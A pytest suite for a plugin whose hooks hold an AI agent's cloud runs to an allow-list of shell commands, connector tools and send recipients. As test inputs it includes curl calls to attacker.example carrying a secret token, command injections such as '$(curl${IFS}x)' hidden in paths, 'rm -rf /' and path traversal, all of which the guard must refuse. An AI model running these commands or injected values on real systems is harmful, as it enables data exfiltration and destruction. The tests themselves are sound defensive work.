"""The spaces-guard plugin (spec 4.7, layer 1): a cloud run reads no repository's hooks, so the task enables this
plugin, whose hooks hand each call to the workspace's own guards with the profile `cloud.py begin` wrote, as the
computer's routine profile runs them. Outside a cloud run it lets everything through; before `begin` only `begin`
runs. Tested as the process the hook starts, and as the hook's command through the shell Claude Code uses."""
import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

import bash_guard
import routine
import send_guard
from conftest import make_space

TEMPLATE = Path(__file__).resolve().parents[3]
PLUGIN = TEMPLATE / "_meta" / "plugins" / "spaces-guard"
ADA = "ada@example.test"
BEGIN = "python3 /home/user/ada-space/_meta/tools/cloud.py begin /home/user/ada-space --chain sweep"
MAIL_READ, MAIL_SEND, MAIL_TRASH = "mcp__mail__get_message", "mcp__mail__send_message", "mcp__mail__trash_message"
TRACKER_WRITE = "mcp__tracker__create_issue"
CLOUD = {"CLAUDE_CODE_REMOTE": "true"}


def load_guard():
    spec = importlib.util.spec_from_file_location("spaces_guard", PLUGIN / "guard.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def payload(mode: str, tool_input: dict, tool: str | None = None) -> dict:
    name = tool or {"bash": "Bash", "task": "Agent", "connector": MAIL_READ, "send": MAIL_SEND}[mode]
    return {"hook_event_name": "PreToolUse", "tool_name": name, "tool_input": tool_input}


def decide(mode: str, tool_input: dict, env: dict, tool: str | None = None, script: Path | None = None) -> str:
    """What the guard answers, run as the hook runs it: a process given the hook's JSON on stdin, in an environment
    that is this one less any cloud marker, plus `env`."""
    base = {k: v for k, v in os.environ.items() if k.upper() != "CLAUDE_CODE_REMOTE"}
    got = subprocess.run([sys.executable, "-I", str(script or PLUGIN / "guard.py"), mode],
                         input=json.dumps(payload(mode, tool_input, tool)).encode(), env={**base, **env},
                         capture_output=True, timeout=120)
    return {0: "allow", 2: "deny"}.get(got.returncode, f"exit {got.returncode}")


@pytest.fixture
def cloud(tmp_path) -> dict:
    """A cloud run after `begin`: Ada's workspace with its own guards, the routine profile written as `begin` writes
    it (`routine.routine_settings`, the grant's tools, `/bin/sh`), and the run's state beside it in the home folder."""
    ws = make_space(tmp_path / "ada-space").resolve()
    tools = ws / "_meta" / "tools"
    tools.mkdir(parents=True, exist_ok=True)
    shutil.copy(bash_guard.__file__, tools / "bash_guard.py")
    shutil.copy(send_guard.__file__, tools / "send_guard.py")
    home = tmp_path / "home"
    folder = home / ".spaces" / "routines"
    folder.mkdir(parents=True)
    profile = folder / "cloud-sweep.settings.json"
    data = routine.routine_settings(ws, "", [ws], ADA, [MAIL_READ], [TRACKER_WRITE], [MAIL_SEND], profile=profile,
                                    known_tools=[MAIL_READ, MAIL_SEND, MAIL_TRASH, TRACKER_WRITE], shell="/bin/sh")
    profile.write_text(json.dumps(data), encoding="utf-8")
    state = folder / "cloud.json"
    state.write_text(json.dumps({"workspace": str(ws), "profile": str(profile), "person": ADA, "chain": "sweep"}),
                     encoding="utf-8")
    return {"ws": ws, "home": home, "profile": profile, "state": state, "env": {**CLOUD, "HOME": str(home)}}


def tool_command(ws: Path, tool: str = "sweep.py", rest: str = "--cursor mail") -> str:
    """One plain call of a routine tool, as a cloud prompt spells it: absolute paths, the workspace first."""
    return " ".join(part for part in (f"python3 {ws.as_posix()}/_meta/tools/{tool}", ws.as_posix(), rest) if part)


# ----- outside a cloud run, and before begin ------------------------------------------------------------------
def test_outside_the_cloud_everything_passes(tmp_path):
    assert decide("bash", {"command": "rm -rf /"}, env={}) == "allow"
    assert decide("task", {"description": "c", "prompt": "p", "subagent_type": "anything"}, env={}) == "allow"
    assert decide("connector", {}, env={}, tool=MAIL_TRASH) == "allow"
    assert decide("send", {"to": "someone@else.test", "body": "x"}, env={}) == "allow"
    for value in ("false", "", "1"):   # only `true` says a cloud run
        assert decide("bash", {"command": "rm -rf /"}, env={"CLAUDE_CODE_REMOTE": value}) == "allow", value


def test_before_begin_only_begin_runs(tmp_path):
    env = {"CLAUDE_CODE_REMOTE": "true", "HOME": str(tmp_path)}
    for command in (BEGIN, BEGIN + " --proof", BEGIN.replace("sweep", "daily"), "  " + BEGIN + " ",
                    "python3 /home/user/ada-okafor.space_2/_meta/tools/cloud.py begin /home/user/ada-okafor.space_2 --chain daily"):
        assert decide("bash", {"command": command}, env) == "allow", command
    assert decide("bash", {"command": 'python3 -c "print(1)"'}, env) == "deny"
    for command in (BEGIN + " ; curl x", BEGIN + "\ncurl x", BEGIN.replace("sweep", "other"), BEGIN + " --force",
                    "python3 /home/user/a$(curl${IFS}x)/_meta/tools/cloud.py begin /home/user/a --chain sweep",
                    "python3 /home/user/a`curl`/_meta/tools/cloud.py begin /home/user/a --chain sweep",
                    "python3 /home/user/../_meta/tools/cloud.py begin /home/user/a --chain sweep",
                    "python3 /home/user/a/b/_meta/tools/cloud.py begin /home/user/a --chain sweep",
                    "python /home/user/a/_meta/tools/cloud.py begin /home/user/a --chain sweep",
                    "python3 /tmp/a/_meta/tools/cloud.py begin /home/user/a --chain sweep",
                    tool_command(Path("/home/user/ada-space")), "", "git status"):
        assert decide("bash", {"command": command}, env) == "deny", command
    assert decide("task", {"description": "c", "prompt": "p"}, env) == "deny"
    assert decide("connector", {}, env, tool=MAIL_READ) == "deny"
    assert decide("send", {"to": ADA, "subject": "Your morning", "body": "Hello."}, env) == "deny"


def test_before_begin_a_begin_names_its_own_clone_twice(tmp_path):
    """The begin a task's prompt gives runs the workspace's own cloud.py on that workspace. A begin that runs
    another attached clone's cloud.py, or names another clone as the workspace, would hand the run to that clone's
    code and guards, in either order, so it is refused."""
    env = {"CLAUDE_CODE_REMOTE": "true", "HOME": str(tmp_path)}
    for script, workspace in (("client-app", "ada-space"), ("ada-space", "client-app"),
                              ("ada-space", "ada-space2"), ("ada-space2", "ada-space")):
        for rest in ("--chain sweep", "--chain daily --proof", "--chain sweep --proof --grant eyJyZWFkIjpbXX0"):
            command = f"python3 /home/user/{script}/_meta/tools/cloud.py begin /home/user/{workspace} {rest}"
            assert decide("bash", {"command": command}, env) == "deny", command
    assert decide("bash", {"command": BEGIN.replace("ada-space", "client-app")}, env) == "allow"   # the same twice


def test_before_begin_only_the_shell_runs_begin(tmp_path):
    """A call of another tool whose input carries the begin command is not begin."""
    guard = load_guard()
    env = {"CLAUDE_CODE_REMOTE": "true", "HOME": str(tmp_path)}
    for mode in ("task", "connector", "send"):
        raw = json.dumps(payload(mode, {"command": BEGIN, "description": "c", "prompt": "p"})).encode()
        assert guard.main([mode], raw, env) == 2, mode


def test_before_begin_a_proof_may_carry_the_tasks_grant_as_one_word(tmp_path):
    """A proof run's begin carries the task's grant (`cloud.begin_command`): one base64url word right after
    `--proof`, nothing else changes in the command's shape."""
    guard, proof = load_guard(), BEGIN + " --proof"
    for token in ("eyJyZWFkIjpbXX0", "a", "A-_9", "a" * 8192):
        assert guard.BEGIN.fullmatch(f"{proof} --grant {token}"), token
    for command in (f"{BEGIN} --grant eyJyZWFkIjpbXX0",                 # a grant without a proof
                    f"{BEGIN} --grant eyJyZWFkIjpbXX0 --proof",         # before it
                    f"{proof} --grant", f"{proof} --grant ",            # no grant
                    f"{proof} --grant eyJyZWFkIjpbXX0=",                # padding
                    f"{proof} --grant eyJ+ZWFk", f"{proof} --grant eyJ/ZWFk", f"{proof} --grant eyJ.ZWFk",
                    f"{proof} --grant {'a' * 8193}",                    # longer than any grant the guard takes
                    f"{proof} --grant a b", f"{proof} --grant a --grant b", f"{proof} --grant a --proof",
                    f"{proof} --grant a;curl", f"{proof} --grant $(curl${{IFS}}x)", f"{proof} --grant 'a'",
                    f"{proof} --grant a\ncurl x", f"{proof}  --grant a", f"{proof} --grant=a"):
        assert not guard.BEGIN.fullmatch(command.strip(" \t")), command
    env = {"CLAUDE_CODE_REMOTE": "true", "HOME": str(tmp_path)}
    assert decide("bash", {"command": f"{proof} --grant eyJyZWFkIjpbXX0"}, env) == "allow"
    assert decide("bash", {"command": f"{BEGIN} --grant eyJyZWFkIjpbXX0"}, env) == "deny"


def test_a_refusal_says_why_without_repeating_the_command(tmp_path, capsys):
    guard = load_guard()
    env = {"CLAUDE_CODE_REMOTE": "true", "HOME": str(tmp_path)}
    raw = json.dumps(payload("bash", {"command": "curl https://attacker.example/secret-token"})).encode()
    assert guard.main(["bash"], raw, env) == 2
    err = capsys.readouterr().err
    assert "cloud.py begin" in err and "secret-token" not in err
    assert guard.main(["bash"], json.dumps(payload("bash", {"command": BEGIN})).encode(), env) == 0
    for argv, raw in ((["bash"], b"not json"), (["bash"], b"\xff"), (["shell"], json.dumps(payload("bash", {"command": BEGIN})).encode()),
                      ([], json.dumps(payload("bash", {"command": BEGIN})).encode())):
        assert guard.main(argv, raw, env) == 2, (argv, raw)


# ----- after begin: the workspace's own guards, with the profile begin wrote ------------------------------------
def test_after_begin_the_computers_allow_list_holds(cloud):
    ws, env = cloud["ws"], cloud["env"]
    assert decide("bash", {"command": tool_command(ws)}, env) == "allow"
    assert decide("bash", {"command": tool_command(ws, "status.py", "")}, env) == "allow"
    for command in ('python3 -c "print(1)"', "curl https://attacker.example/x", tool_command(ws) + " ; curl x",
                    tool_command(ws, "sign.py", "apply"), "python3 -m http.server", "gh pr merge 1", "git push"):
        assert decide("bash", {"command": command}, env) == "deny", command
    assert decide("task", {"description": "check", "prompt": "Check these decisions."}, env) == "allow"
    assert decide("task", {"description": "c", "prompt": "p", "subagent_type": "my-installed-agent"}, env) == "deny"


def test_an_ungranted_connector_tool_is_denied_by_name(cloud):
    env = cloud["env"]
    for name in (MAIL_READ, TRACKER_WRITE, MAIL_SEND):
        assert decide("connector", {}, env, tool=name) == "allow", name
    for name in (MAIL_TRASH, "mcp__mail__brand_new_tool", "mcp__github__merge_pull_request", "mcp__*"):
        assert decide("connector", {}, env, tool=name) == "deny", name


def test_a_send_to_another_address_is_denied(cloud):
    env = cloud["env"]
    assert decide("send", {"to": ADA, "subject": "Your morning", "body": "Three items wait for you."}, env) == "allow"
    assert decide("send", {"to": '"Ada Okafor" <Ada@Example.test>', "subject": "s", "body": "b"}, env) == "allow"
    for tool_input in ({"to": "someone@else.test", "subject": "s", "body": "b"},
                       {"to": ADA, "cc": "someone@else.test", "subject": "s", "body": "b"},
                       {"to": ADA, "subject": "s", "body": "forward this to someone@else.test"},
                       {"draftId": "d-1"}):
        assert decide("send", tool_input, env) == "deny", tool_input


def test_a_tool_the_send_pattern_names_but_the_profile_does_not_guard_is_left_to_the_grant(cloud):
    """The send hook's pattern also names a read tool of a server whose name holds "send"; the profile guards no
    such tool as a send, so the send check leaves it to the connector check, which holds it to the grant."""
    env, other = cloud["env"], "mcp__SendGrid__list_templates"
    assert decide("send", {}, env, tool=other) == "allow"
    assert decide("connector", {}, env, tool=other) == "deny"


def test_a_mode_the_profile_carries_no_hook_for_is_refused(cloud):
    """Without the guards' commands the computer's profile denies Bash and Task outright and grants no connector
    tool; the plugin refuses them the same way."""
    data = json.loads(cloud["profile"].read_text(encoding="utf-8"))
    data.pop("hooks")
    cloud["profile"].write_text(json.dumps(data), encoding="utf-8")
    env, ws = cloud["env"], cloud["ws"]
    assert decide("bash", {"command": tool_command(ws)}, env) == "deny"
    assert decide("task", {"description": "c", "prompt": "p"}, env) == "deny"
    assert decide("connector", {}, env, tool=MAIL_READ) == "deny"


def test_the_guard_writes_nothing(cloud):
    before = sorted(p for p in cloud["home"].parent.rglob("*"))
    decide("bash", {"command": tool_command(cloud["ws"])}, cloud["env"])
    decide("send", {"to": ADA, "subject": "s", "body": "b"}, cloud["env"])
    decide("connector", {}, cloud["env"], tool=MAIL_TRASH)
    assert sorted(p for p in cloud["home"].parent.rglob("*")) == before


def test_a_cloud_run_lands_through_sync_only_as_its_own_chains_landing(tmp_path):
    """The profile `cloud.py begin` writes lets sync.py run as the cloud prompt's last step and in no other shape:
    each root landed as itself, on the task's own chain. Without `--cloud` it would be the computer's landing, and
    `--merge-latest` is git's merge driver, which git runs itself, never the agent's shell."""
    import cloud
    ws = make_space(tmp_path / "ada-space").resolve()
    other = make_space(tmp_path / "ada-harbor").resolve()
    tools = ws / "_meta" / "tools"
    tools.mkdir(parents=True, exist_ok=True)
    shutil.copy(bash_guard.__file__, tools / "bash_guard.py")
    shutil.copy(send_guard.__file__, tools / "send_guard.py")
    cloud.write_profile(ws, [ws, other], "sweep", {"read": [MAIL_READ], "write": [], "send": [MAIL_SEND]}, ADA)
    env = {**CLOUD, "HOME": str(Path.home())}
    sync = lambda root, rest: f"python3 {root.as_posix()}/_meta/tools/sync.py {rest}"   # noqa: E731
    for root in (ws, other):
        assert decide("bash", {"command": sync(root, f"--root {root.as_posix()} --cloud sweep")}, env) == "allow"
    for command in (sync(ws, f"--root {ws.as_posix()}"), sync(ws, f"--root {ws.as_posix()} --cloud daily"),
                    sync(ws, f"--root {other.as_posix()} --cloud sweep"), sync(ws, f"--cloud sweep --root {ws.as_posix()}"),
                    sync(ws, f"--root {ws.as_posix()} --cloud sweep --no-push"),
                    sync(ws, f"--root {ws.as_posix()} --release-leg"), sync(ws, f"--root {ws.as_posix()} --cloud 'sweep'"),
                    sync(ws, f"--merge-latest a {ws.as_posix()}/space.yaml b"), sync(ws, f"--merge a {ws.as_posix()}/space.yaml b"),
                    sync(ws, ""), f"python3 _meta/tools/sync.py --root {ws.as_posix()} --cloud sweep"):
        assert decide("bash", {"command": command}, env) == "deny", command


# ----- failing closed ----------------------------------------------------------------------------------------
def test_a_guard_that_crashes_denies(cloud):
    ws, env = cloud["ws"], cloud["env"]
    (ws / "_meta" / "tools" / "bash_guard.py").write_text("raise RuntimeError('broken')\n", encoding="utf-8")
    assert decide("bash", {"command": tool_command(ws)}, env) == "deny"
    assert decide("connector", {}, env, tool=MAIL_READ) == "deny"
    (ws / "_meta" / "tools" / "send_guard.py").unlink()   # a guard that is not there
    assert decide("send", {"to": ADA, "subject": "s", "body": "b"}, env) == "deny"


def unreadable(tool_input: dict) -> list:
    """Hook events the guard cannot read: not a mapping, or naming no tool by a string (the hook always names one)."""
    return [[], [tool_input], "Bash", 7, None, {"tool_input": tool_input},
            *({"tool_name": name, "tool_input": tool_input} for name in (7, None, "", ["Bash"], {"name": "Bash"}))]


def test_a_request_that_names_no_tool_is_refused_in_every_mode(cloud, capsys):
    """The guard refuses such a request itself, whatever the workspace's guard would say: here both let
    everything through."""
    guard, env, ws = load_guard(), cloud["env"], cloud["ws"]
    for script in ("bash_guard.py", "send_guard.py"):
        (ws / "_meta" / "tools" / script).write_text("import sys\nsys.exit(0)\n", encoding="utf-8")
    inputs = {"bash": {"command": tool_command(ws)}, "task": {"description": "check", "prompt": "Check these."},
              "connector": {}, "send": {"to": ADA, "subject": "Your morning", "body": "Three items wait for you."}}
    for mode, tool_input in inputs.items():
        assert guard.main([mode], json.dumps(payload(mode, tool_input)).encode(), env) == 0, mode
        for event in unreadable(tool_input):
            assert guard.main([mode], json.dumps(event).encode(), env) == 2, (mode, event)
            assert guard.main([mode], json.dumps(event).encode(), {}) == 0, (mode, event)   # a computer: unchanged
    err = capsys.readouterr().err
    assert "names no tool" in err and ws.as_posix() not in err


def test_before_begin_a_request_that_names_no_tool_is_refused(tmp_path):
    guard = load_guard()
    env = {"CLAUDE_CODE_REMOTE": "true", "HOME": str(tmp_path)}
    assert guard.main(["bash"], json.dumps(payload("bash", {"command": BEGIN})).encode(), env) == 0
    for event in unreadable({"command": BEGIN}):
        assert guard.main(["bash"], json.dumps(event).encode(), env) == 2, event


@pytest.mark.parametrize("text", ["{not json", "[]", '{"workspace": 7}', '{"profile": "x.json"}', ""])
def test_a_state_it_cannot_read_denies(cloud, text):
    cloud["state"].write_text(text, encoding="utf-8")
    assert decide("bash", {"command": tool_command(cloud["ws"])}, cloud["env"]) == "deny"
    assert decide("bash", {"command": BEGIN}, cloud["env"]) == "deny"   # a state that is there is past begin


def test_a_profile_it_cannot_read_denies(cloud):
    cloud["profile"].unlink()
    assert decide("bash", {"command": tool_command(cloud["ws"])}, cloud["env"]) == "deny"
    assert decide("send", {"to": ADA, "subject": "s", "body": "b"}, cloud["env"]) == "deny"


def test_a_send_without_the_persons_address_denies(cloud):
    state = json.loads(cloud["state"].read_text(encoding="utf-8"))
    state.pop("person")
    cloud["state"].write_text(json.dumps(state), encoding="utf-8")
    assert decide("send", {"to": ADA, "subject": "s", "body": "b"}, cloud["env"]) == "deny"


def test_a_workspace_guard_that_takes_too_long_denies(tmp_path):
    guard = load_guard()
    slow = tmp_path / "slow_guard.py"
    slow.write_text("import time\ntime.sleep(30)\n", encoding="utf-8")
    reason = guard.delegate(slow, [], b"{}", seconds=1)
    assert reason and "too long" in reason
    assert guard.DELEGATE_SECONDS == 20 and guard.DELEGATE_SECONDS < guard.LIMIT_SECONDS


def test_the_guard_ends_itself_with_a_refusal_once_its_own_time_is_up():
    code = ("import importlib.util, sys, threading; spec = importlib.util.spec_from_file_location('g', sys.argv[1]); "
            "g = importlib.util.module_from_spec(spec); spec.loader.exec_module(g); g.LIMIT_SECONDS = 0.2; "
            "g.main = lambda argv, raw, env=None: threading.Event().wait(); sys.argv = ['guard.py', 'bash']; sys.exit(g.run())")
    got = subprocess.run([sys.executable, "-I", "-c", code, str(PLUGIN / "guard.py")],
                         input=json.dumps(payload("bash", {"command": BEGIN})).encode(), capture_output=True, timeout=60)
    assert got.returncode == 2 and b"took too long" in got.stderr


def test_the_guard_needs_nothing_but_the_standard_library():
    text = (PLUGIN / "guard.py").read_text(encoding="utf-8")
    imports = {line.split()[1].split(".")[0] for line in text.splitlines() if line.startswith(("import ", "from "))}
    assert imports <= {"__future__", "faulthandler", "json", "os", "pathlib", "re", "subprocess", "sys", "threading"}


# ----- the plugin's files --------------------------------------------------------------------------------------
def hooks() -> list:
    return json.loads((PLUGIN / "hooks" / "hooks.json").read_text(encoding="utf-8"))["hooks"]["PreToolUse"]


def test_the_hooks_file_points_every_mode_at_the_guard():
    guard = load_guard()
    entries = {e["matcher"]: e["hooks"] for e in hooks()}
    modes = {"Bash": "bash", routine.TASK_MATCHER: "task", routine.CONNECTOR_MATCHER: "connector",
             guard.SEND_MATCHER: "send"}
    assert set(entries) == set(modes)
    for matcher, mode in modes.items():
        [hook] = entries[matcher]
        assert hook["type"] == "command"
        assert hook["command"] == (f'python3 -I "${{CLAUDE_PLUGIN_ROOT}}/guard.py" {mode} '
                                   '|| test "$CLAUDE_CODE_REMOTE" != true || exit 2')
        assert hook["timeout"] > guard.LIMIT_SECONDS + 2   # the guard ends itself first: a hook cut off lets the call through
    assert (guard.BASH_MATCHER, guard.TASK_MATCHER, guard.CONNECTOR_MATCHER) == ("Bash", routine.TASK_MATCHER,
                                                                                  routine.CONNECTOR_MATCHER)


def test_the_send_hook_names_every_tool_the_computer_guards_as_a_send():
    send = load_guard().SEND_MATCHER
    for name in ("mcp__mail__send_message", "mcp__claude_ai_Gmail__send_message", "mcp__Outlook__SendEmail",
                 "mcp__mail__SEND_DRAFT", "mcp__chat__sendDirectMessage"):
        assert routine._sends(name) and re.fullmatch(send, name), name
    for name in ("Bash", "Agent", "mcp__mail__get_message"):
        assert not re.fullmatch(send, name), name


def test_the_hook_command_blocks_in_the_cloud_and_passes_on_a_computer_when_the_guard_cannot_start(tmp_path):
    shell = routine.hook_shell()
    if shell is None:
        pytest.skip("no Git Bash on this Windows")
    python = Path(sys.executable).as_posix()
    command = next(e for e in hooks() if e["matcher"] == "Bash")["hooks"][0]["command"]
    command = command.replace("python3", f'"{python}"', 1)   # the cloud's interpreter is python3; this one runs the test
    base = {k: v for k, v in os.environ.items() if k.upper() != "CLAUDE_CODE_REMOTE"}

    def run(root: Path, env: dict, line: str) -> int:
        return subprocess.run([*shell, command], input=json.dumps(payload("bash", {"command": line})).encode(),
                              env={**base, "CLAUDE_PLUGIN_ROOT": str(root), "HOME": str(tmp_path), **env},
                              capture_output=True, timeout=120).returncode
    assert run(PLUGIN, CLOUD, BEGIN) == 0
    assert run(PLUGIN, CLOUD, 'python3 -c "print(1)"') == 2
    assert run(PLUGIN, {}, 'python3 -c "print(1)"') == 0
    missing = tmp_path / "no-plugin"
    assert run(missing, CLOUD, BEGIN) == 2   # a guard that cannot start blocks in a cloud run
    assert run(missing, {}, BEGIN) == 0      # and changes nothing on a computer


def test_the_marketplace_offers_the_guard():
    market = json.loads((TEMPLATE / ".claude-plugin" / "marketplace.json").read_text(encoding="utf-8"))
    assert market["name"] == "spaces" and market["owner"] == {"name": "spaces"}
    [entry] = market["plugins"]
    assert entry["name"] == "spaces-guard" and entry["source"] == "./_meta/plugins/spaces-guard" and entry["description"]
    plugin = json.loads((TEMPLATE / entry["source"] / ".claude-plugin" / "plugin.json").read_text(encoding="utf-8"))
    assert plugin["name"] == "spaces-guard" and re.fullmatch(r"\d+\.\d+\.\d+", plugin["version"]) and plugin["description"]
    assert (TEMPLATE / entry["source"] / "hooks" / "hooks.json").is_file()
